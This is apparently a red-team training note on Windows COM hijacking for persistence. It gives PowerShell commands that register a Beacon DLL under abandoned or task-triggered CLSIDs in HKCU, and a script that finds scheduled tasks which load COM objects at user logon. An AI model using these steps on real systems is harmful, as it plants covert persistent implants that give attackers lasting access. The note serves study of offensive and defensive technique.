
Check [[COM Objects]] for theory.
Instead of hijacking COM objects that are in-use and breaking applications that rely on them, a safer strategy is to find instances of applications trying to load objects that don't actually exist (so-called "abandoned" keys).
[Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) is part of the excellent [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite). It shows real-time file system, registry and process activity and is very useful in finding different types of privilege escalation primitives.


## 🖊️ via Process Monitor

1) Start processmonitor.exe
2) Search for events with the following filters:

- _RegOpenKey_ operations.
- where the Result is _NAME NOT FOUND_.
- and the Path ends with _InprocServer32_.
![[procmon-filter.png]]
3) Let it run for about a minute. One aspect to look out for is the number of times a particular CLSID is loaded. If you hijack one that is loaded every couple of seconds, you're going to have a rough time - so it's well worth the additional effort to find one that's loaded semi-frequently but not so much so or loaded when a commonly used application (Word, Excel, Outlook, etc) is opened.
4) Once you pick up an CLSID, check if it exists in HKCU and HKCM:

`Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"`

`Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"`

6) To exploit this, we can create the necessary registry entries in HKCU and point them at a Beacon DLL.  Because this is still on our attacking machine, we'll point it straight at `C:\Payloads\http_x64.dll`.
```
PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
PS C:\Users\Attacker> New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
PS C:\Users\Attacker> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

If this was the victim machine, you have to drop the dll in the box. When the dll loads, you should get a beacon. 

## 📔 via Task Scheduler

Another great place to look for hijackable COM components is in the Task Scheduler. Rather than executing binaries on disk, many of the default Windows Tasks actually use Custom Triggers to call COM objects. And because they're executed via the Task Scheduler, it's easier to predict when they're going to be triggered. We can use the following PowerShell to find compatible tasks.
```
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```

  

This script is rather self-explanatory and should produce an output similar to the following:
```
Task Name:  SystemSoundsService
Task Path:  \Microsoft\Windows\Multimedia\
CLSID:  {2DEA658F-54C1-4227-AF9B-260AB5FC3543}

Task Name:  MsCtfMonitor
Task Path:  \Microsoft\Windows\TextServicesFramework\
CLSID:  {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}

```

  
If we view the _MsCtfMonitor_ task in the Task Scheduler, we can see that it's triggered when any user logs in.  This would act as an effective reboot-persistence.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/host-persistence/MsCtfMonitor.png)

  

Lookup the current implementation of {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} in _HKEY_CLASSES_ROOT\CLSID_**.**
```
PS C:\> Get-ChildItem -Path "Registry::HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\MsCtfMonitor.dll
               ThreadingModel : Both

  
```

We can see it's another InprocServer32 (like in process monitor section above) and we can verify that it's currently implemented in HKLM and not HKCU.
```
PS C:\> Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler


PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
  
Now it's simply a case of adding a duplicate entry into HKCU pointing to our DLL (as process monitor section above), and this will be loaded once every time a user logs in.

##  📗 Action to perform 

1. 


### Properties
---
📆 created   {{07-02-2024}} 14:58
🏷️ tags: #redteam #crto 

---

